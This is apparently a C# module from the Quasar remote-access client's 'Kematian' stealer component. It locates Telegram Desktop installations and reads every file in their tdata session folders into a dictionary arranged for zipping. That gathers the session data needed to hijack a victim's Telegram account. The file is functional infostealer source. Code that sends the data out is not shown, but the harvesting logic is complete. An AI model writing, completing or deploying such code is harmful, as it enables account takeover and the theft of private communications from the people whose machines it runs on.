using System;
using System.IO;
using System.Collections.Generic;

namespace Quasar.Client.Kematian.Telegram
{
    public class TelegramRetriever
    {
        private static readonly string[] PossibleTelegramPaths = new[]
        {
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Telegram Desktop"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Telegram Desktop")
        };

        public static string GetTelegramSessions()
        {
            List<string> sessionFiles = new List<string>();
            bool multipleInstalls = false;
            int profileCount = 0;

            foreach (string telegramPath in PossibleTelegramPaths)
            {
                if (Directory.Exists(telegramPath))
                {
                    profileCount++;
                    if (profileCount > 1)
                    {
                        multipleInstalls = true;
                    }

                    string tdataPath = Path.Combine(telegramPath, "tdata");
                    if (Directory.Exists(tdataPath))
                    {
                        sessionFiles.Add($"Profile {profileCount}: {telegramPath}");
                    }
                }
            }

            if (sessionFiles.Count == 0)
            {
                return "No Telegram installations found";
            }

            string result = multipleInstalls
                ? "Multiple Telegram installations are found, so the files for each of them are put in different Profiles\n"
                : "Telegram installation found\n";

            return result + string.Join("\n", sessionFiles);
        }
        public static Dictionary<string, byte[]> GetTelegramSessionFiles()
        {
            Dictionary<string, byte[]> sessionFiles = new Dictionary<string, byte[]>();
            int profileCount = 0;

            foreach (string telegramPath in PossibleTelegramPaths)
            {
                if (Directory.Exists(telegramPath))
                {
                    profileCount++;
                    string tdataPath = Path.Combine(telegramPath, "tdata");
                    if (Directory.Exists(tdataPath))
                    {
                        string profileFolder = $"Telegram\\Profile_{profileCount}";
                        foreach (string filePath in Directory.GetFiles(tdataPath))
                        {
                            try
                            {
                                byte[] fileContent = File.ReadAllBytes(filePath);
                                string fileName = Path.GetFileName(filePath);
                                string zipPath = $"{profileFolder}\\{fileName}";
                                sessionFiles[zipPath] = fileContent;
                            }
                            catch (Exception ex)
                            {
                                // if isssues put something here to catch the errors or smth
                            }
                        }
                    }
                }
            }

            return sessionFiles;
        }
    }
}